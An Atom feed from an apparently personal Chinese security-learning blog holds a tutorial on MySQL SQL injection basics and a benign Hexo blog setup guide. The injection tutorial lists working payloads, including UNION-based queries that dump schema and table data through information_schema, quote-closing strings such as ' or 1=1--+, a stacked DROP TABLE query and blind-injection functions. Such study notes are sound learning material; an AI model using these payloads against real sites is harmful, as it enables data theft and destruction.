<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J3fffff&#39;s Blog</title>
  
  
  <link href="https://j3f5.github.io/atom.xml" rel="self"/>
  
  <link href="https://j3f5.github.io/"/>
  <updated>2023-05-23T07:12:45.837Z</updated>
  <id>https://j3f5.github.io/</id>
  
  <author>
    <name>Jeff</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入基础</title>
    <link href="https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</id>
    <published>2023-05-23T02:29:45.000Z</published>
    <updated>2023-05-23T07:12:45.837Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2265061-20210114103534539-1238016327.png" alt="img"></p><h2 id="基础语法以及函数"><a href="#基础语法以及函数" class="headerlink" title="基础语法以及函数"></a>基础语法以及函数</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 查询</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"># 更新</span><br><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> department<span class="operator">=</span><span class="string">&#x27;abc&#x27;</span> <span class="keyword">where</span> usid<span class="operator">=</span><span class="number">123456</span></span><br><span class="line"># 添加</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users(id,url,text) <span class="keyword">values</span>(<span class="number">2</span>,‘x’,’$t’)</span><br><span class="line"># 增加字段</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> employees <span class="keyword">ADD</span> phone <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line"># 权限控制(<span class="keyword">grant</span> <span class="keyword">revoke</span>)</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">insert</span> <span class="keyword">on</span> grant_rights <span class="keyword">to</span> unauthorized_user</span><br><span class="line"># 删表</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> users;</span><br></pre></td></tr></table></figure><h3 id="连接词、联合查询"><a href="#连接词、联合查询" class="headerlink" title="连接词、联合查询"></a>连接词、联合查询</h3><p><strong>union：</strong>联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p><strong>join</strong>：连接查询（right&#x2F;left join），如下搜索两个表相同的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">where</span> a.id <span class="operator">=</span> b.id</span><br></pre></td></tr></table></figure><h3 id="注释以及其他符号"><a href="#注释以及其他符号" class="headerlink" title="注释以及其他符号"></a>注释以及其他符号</h3><p><strong>注释：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* */</span>          <span class="keyword">are</span> inline comments</span><br><span class="line"><span class="comment">-- , #          are line comments</span></span><br><span class="line"></span><br><span class="line">Example: <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">-- AND pass = &#x27;pass&#x27;</span></span><br></pre></td></tr></table></figure><p>对于<code>#</code></p><ol><li>url中的#是用来指导浏览器动作的（例如锚点），对服务端完全无用</li><li>所以在URL中使用#进行注入时应该将它转成url编码：<code>%23</code></li><li>在POST请求中就不需要（需要验证）</li></ol><p>对于<code>--(空格)</code></p><ol><li>一般在GET请求中，空格会直接被忽略，所以需要把他转化成<code>--%20</code></li><li>还有另外一种方式，就是使用<code>--+</code>，这时候+号会被解释成空格</li><li>为什么要加空格：因为这样可以和后面的单引号隔开，才能形成有效的payload</li></ol><p>对于需要编码转码的<code>#</code>有用，因为只有一个字符，POST最好用这个，其他用<code>--+</code></p><p><strong>堆叠查询：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;        allows query chaining</span><br><span class="line"></span><br><span class="line">Example: <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> users;</span><br></pre></td></tr></table></figure><p><strong>查询可用：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,+,||         allows string concatenation</span></span><br><span class="line"><span class="string">Char()         strings without quotes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example: SELECT * FROM users WHERE name = &#x27;</span><span class="operator">+</span><span class="type">char</span>(<span class="number">27</span>) <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="注入原理以及危害"><a href="#注入原理以及危害" class="headerlink" title="注入原理以及危害"></a>注入原理以及危害</h2><p>对于传入的搜索内容<strong>过滤不严</strong>，导致用户可以通过拼接SQL语句，对数据库进行操作。</p><p>以下情形均可能产生漏洞：</p><ol><li>接收数据</li><li>拼接数据</li><li>数据库执行</li><li>结果展示</li></ol><p>他会导致如下危害：</p><ol><li><p>危害数据库里的<strong>数据</strong></p></li><li><p>直接危害网站的<strong>权限</strong></p></li></ol><p>我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用<strong>猜测</strong>到对方的 <strong>SQL 查询方式</strong></p><h1 id="基本注入"><a href="#基本注入" class="headerlink" title="基本注入"></a>基本注入</h1><p><strong>这里以mysql注入为例子</strong></p><p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20230523110144810.png" alt="image-20230523110144810"></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>主要搜集：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 操作系统</span><br><span class="line">select @@version_compile_os</span><br><span class="line"># 数据库版本：</span><br><span class="line">select version()</span><br><span class="line">select @@version</span><br><span class="line"># 数据库名字：</span><br><span class="line">select database()</span><br><span class="line"># 数据库用户：</span><br><span class="line">select user()</span><br></pre></td></tr></table></figure><p>在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，</span><br><span class="line">table_schema和table_name分别来存储数据库名和表名</span><br><span class="line">information_schema.tables 记录所有的表</span><br><span class="line">information_schema.columns 记录所有的列</span><br></pre></td></tr></table></figure><p>小知识点：</p><blockquote><p>问：一个@与两个@@有何区别？</p><p>答：一个@是用户自定义变量，两个@是系统变量</p></blockquote><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li><p><strong>判断是否能注入，以及注入类型</strong></p><ol><li>先看<strong>是否输出信息</strong>：可以使用<code>&#39;</code>、<code>&quot;</code> 和<code>--+</code>来测试</li><li>输出<strong>正确</strong>、<strong>错误</strong>与<strong>报错</strong>信息：都可以</li><li>输出<strong>正确</strong>、<strong>报错</strong>但不输出错误信息：布尔&#x2F;时间盲注&#x2F;报错注入</li><li>输出<strong>正确</strong>但不输出报错和错误信息：布尔&#x2F;时间盲注</li><li><strong>不输出</strong>任何信息：时间盲注</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 或 且 非 三种逻辑判断符</span><br><span class="line">id=-1&#x27; and 1=1</span><br></pre></td></tr></table></figure></li><li><p><strong>判断有几个注入点：</strong><code>id=1&#39; order by 3--+</code></p></li><li><p><strong>判断输出点有几个是可以回显的</strong>：<code>id=1&#39; union select 1,2,3 --+</code> </p></li><li><p><strong>信息搜集：</strong></p><ol><li>获取数据库:<ol><li>获取此时的数据库：<code>id=-1&#39; union select 1,2,database() --+</code></li><li>获取全部数据库：<code>id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></li></ol></li><li>获取表名:<code>id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code><ol><li>查询其他数据库表名把<code>database()</code>换成<code>&#39;you_want&#39;</code></li></ol></li><li>获取列名：<code>id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;you_want --+&#39;</code></li></ol></li><li><p><strong>数据获取：</strong></p><ol><li>获取单个：<code>id=-1&#39; union select 1,2,[columnname] from [tablename] --+&#39;</code></li><li>获取全部：<ol><li><code>id=-1&#39; union select 1,2,group_concat([allcolumnname]) from [tablename]--+</code></li><li><code>-1&#39; union select 1,2,(select concat_ws([column_name]) from [tbname]) --+</code></li></ol></li></ol></li></ol><h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><p><strong>常用闭合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+ （数字型）</span><br><span class="line">&#x27; or 1=1--+ （字符型）</span><br><span class="line">&quot; or 1=1--+ （字符型）</span><br><span class="line">) or 1=1--+ （MySQL是允许嵌入多个括号的）</span><br><span class="line">&#x27;) or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;)) or 1=1--+</span><br></pre></td></tr></table></figure><p><strong>非注释闭合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|| &#x27;</span><br><span class="line">or &#x27;</span><br><span class="line">&amp;&amp; &#x27;1&#x27;=&#x27;1</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure><h2 id="报错and盲注"><a href="#报错and盲注" class="headerlink" title="报错and盲注"></a>报错and盲注</h2><p>盲注就是在注入过程中，获取的<strong>数据不能回显</strong>至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p><ol><li>基于布尔的 SQL 盲注-逻辑判断：<code>regexp</code>，<code>like</code>，<code>ascii</code>，<code>left</code>，<code>ord</code>，<code>mid</code></li><li>基于时间的 SQL 盲注-延时判断：<code>if</code>，<code>sleep</code></li><li>基于报错的 SQL 盲注-报错回显：<code>floor</code>，<code>updatexml</code>，<code>extractvalue</code></li></ol><p>参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">like ‘ro%’#判断ro或ro…是否成立</span><br><span class="line">regexp ‘^xiaodi[1-z]’#匹配xiaodi及xiaodi…等</span><br><span class="line">if(条件,5,0)#条件成立，返回5，反之，返回0</span><br><span class="line">sleep(5) #SQL语句延时执行5秒</span><br><span class="line">mid(a,b,c) #从位置b开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c) #从B位置开始，截取字符串a的c长度</span><br><span class="line">left(database(),1),database() #left(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())=8 #判断数据库database()名的长度</span><br><span class="line">ord=ascii ascii(x)=97 #判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure><p>涉及资源：</p><ol><li><p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">12种报错注入+万能语句</a></p></li><li><p><a href="https://www.jianshu.com/p/fcae21926e5c">Order by排序注入方法小总结</a></p></li></ol><h3 id="Insert"><a href="#Insert" class="headerlink" title="Insert"></a>Insert</h3><p>语句：<code>insert into user(username,password) values(&#39;$username&#39;,&#39;$password&#39;,)</code></p><p>floor</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL注入基础&quot;&gt;&lt;a href=&quot;#SQL注入基础&quot; class=&quot;headerlink&quot; title=&quot;SQL注入基础&quot;&gt;&lt;/a&gt;SQL注入基础&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>HEXO博客的搭建</title>
    <link href="https://j3f5.github.io/articles/2023/05/22/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://j3f5.github.io/articles/2023/05/22/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/</id>
    <published>2023-05-22T12:03:26.000Z</published>
    <updated>2023-05-23T07:12:57.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装HEXO和相关插件"><a href="#安装HEXO和相关插件" class="headerlink" title="安装HEXO和相关插件"></a>安装HEXO和相关插件</h1><h2 id="hexo的安装"><a href="#hexo的安装" class="headerlink" title="hexo的安装"></a>hexo的安装</h2><p>先安装node.js，地址：<a href="https://nodejs.org/en">https://nodejs.org/en</a></p><p>安装完后安装Hexo：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>配置腾讯云节点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry http://mirrors.cloud.tencent.com/npm/</span><br><span class="line">npm config get registry# 如果返回http://mirrors.cloud.tencent.com/npm/，说明镜像配置成功。</span><br></pre></td></tr></table></figure><h2 id="主题Pure以及配置"><a href="#主题Pure以及配置" class="headerlink" title="主题Pure以及配置"></a>主题Pure以及配置</h2><p>主题：<a href="https://github.com/cofess/hexo-theme-pure">https://github.com/cofess/hexo-theme-pure</a></p><p>先初始化一个文件夹，例如Blog：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init Blog</span><br></pre></td></tr></table></figure><p>加载主题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/cofess/hexo-theme-pure.git themes/pure</span><br></pre></td></tr></table></figure><p>更新主题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd themes/pure</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><p>配置（需要配置根目录config）：<a href="https://blog.cofess.com/2017/11/01/hexo-blog-theme-pure-usage-description.html">参考1</a>，<a href="https://w714860761.github.io/2020/06/14/HexoTwo/">参考2</a>，<a href="https://tianbiao.top/29-pure%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/">参考3</a>，<a href="https://hexo.io/zh-cn/docs/configuration.html">参考4</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">language: zh-CN# 中文</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h1><p><a href="https://hexo.io/zh-cn/docs/writing">参考</a>，没啥要讲的，指令：<code>hexo n &quot;title&quot;</code>，即可。</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>模板在目录scaffolds里面，一般新建文件都会附上他的头，推荐头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title: HEXO博客的搭建</span><br><span class="line">toc: true</span><br><span class="line">sidebar: none</span><br><span class="line">date: 2023-05-22 20:03:26</span><br><span class="line">tags: [博客搭建]</span><br><span class="line">categories: [杂]</span><br><span class="line">descriptions: 本文介绍hexo搭建博客的心路历程</span><br><span class="line">typora-root-url: ..\..\..</span><br></pre></td></tr></table></figure><p>上面的<code>typora-root-url</code>很重要！下面说到。</p><h2 id="设置分类"><a href="#设置分类" class="headerlink" title="设置分类"></a>设置分类</h2><p>由于<code>post</code>文件夹里面的文章太多不好管理，那么只要我们分类一下即可。<a href="https://mrseawave.github.io/blogs/articles/2021/06/25/hexo-new-post-path/">参考</a></p><p>配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">permalink: &#x27;articles/:year/:month/:day/:name/&#x27;</span><br><span class="line">new_post_name: &#x27;:year/:month/:title.md&#x27;</span><br></pre></td></tr></table></figure><h2 id="Hexo与Typora协同"><a href="#Hexo与Typora协同" class="headerlink" title="Hexo与Typora协同"></a>Hexo与Typora协同</h2><p>先设置一下图片目录：优先相对路径，自己设置，然后在文件头上蛇者上面的玩意。</p><p>解释：也就是，typora会将图片自动加载到一个文件夹里（它自己设置的），后面我们只需要设置根目录<code>typora-root-url</code>，让hexo能链接到即可！</p><p><a href="https://blog.hjforever.com/2021/03/13/tool/typora_hexo/">参考</a></p><h2 id="404转发"><a href="#404转发" class="headerlink" title="404转发"></a>404转发</h2><p><a href="https://hexo-next.readthedocs.io/zh_CN/latest/hexo/advanced/404%E9%A1%B5%E9%9D%A2/">https://hexo-next.readthedocs.io/zh_CN/latest/hexo/advanced/404%E9%A1%B5%E9%9D%A2/</a></p><h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d # 推送 或者一起：hugo g -d</span><br><span class="line">hexo s # 本地测试</span><br><span class="line"></span><br><span class="line">hexo n &#x27;title&#x27;</span><br></pre></td></tr></table></figure><h2 id="推送hexo-d"><a href="#推送hexo-d" class="headerlink" title="推送hexo d"></a>推送<code>hexo d</code></h2><p>安装<code>npm install hexo-deployer-git --save</code></p><p>然后配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch]</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><p>参考：<a href="https://hexo.io/zh-cn/docs/one-command-deployment.html">https://hexo.io/zh-cn/docs/one-command-deployment.html</a></p><h1 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h1><h2 id="Spawn-failed"><a href="#Spawn-failed" class="headerlink" title="Spawn failed"></a>Spawn failed</h2><p><a href="https://blog.csdn.net/Kevin_Carpricron/article/details/124069885">https://blog.csdn.net/Kevin_Carpricron/article/details/124069885</a></p><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="/images/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/image-20230523145936355.png" alt="image-20230523145936355"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;安装HEXO和相关插件&quot;&gt;&lt;a href=&quot;#安装HEXO和相关插件&quot; class=&quot;headerlink&quot; title=&quot;安装HEXO和相关插件&quot;&gt;&lt;/a&gt;安装HEXO和相关插件&lt;/h1&gt;&lt;h2 id=&quot;hexo的安装&quot;&gt;&lt;a href=&quot;#hexo的安装&quot; c</summary>
      
    
    
    
    <category term="杂" scheme="https://j3f5.github.io/categories/%E6%9D%82/"/>
    
    
    <category term="博客搭建" scheme="https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
</feed>
